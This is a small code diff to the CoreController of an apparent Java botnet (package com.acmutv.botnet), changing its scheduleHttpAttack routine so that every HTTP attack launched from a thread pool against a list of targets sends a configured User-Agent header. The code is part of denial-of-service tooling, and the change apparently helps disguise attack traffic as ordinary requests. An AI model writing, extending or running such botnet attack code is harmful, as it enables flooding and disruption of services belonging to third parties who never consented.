@@ -56,7 +56,9 @@ import java.io.IOException;
 import java.net.SocketException;
 import java.net.UnknownHostException;
 import java.util.ArrayList;
+import java.util.HashMap;
 import java.util.List;
+import java.util.Map;
 import java.util.concurrent.TimeUnit;
 
 import static com.acmutv.botnet.core.control.command.CommandScope.*;
@@ -458,8 +460,10 @@ public class CoreController {
   private static void scheduleHttpAttack(HttpMethod method, List<HttpTarget> targets) {
     LOGGER.traceEntry("method={} targets={} proxy={}", method, targets);
     LOGGER.info("Scheduling attack...");
+    final Map<String,String> props = new HashMap<>();
+    props.put("User-Agent", AppConfigurationService.getConfigurations().getUserAgent());
     targets.forEach(target -> {
-      HttpAttack attacker = new HttpAttack(method, target);
+      HttpAttack attacker = new HttpAttack(method, target, props);
       POOL.submit(attacker);
     });
     LOGGER.info("Attack scheduled");
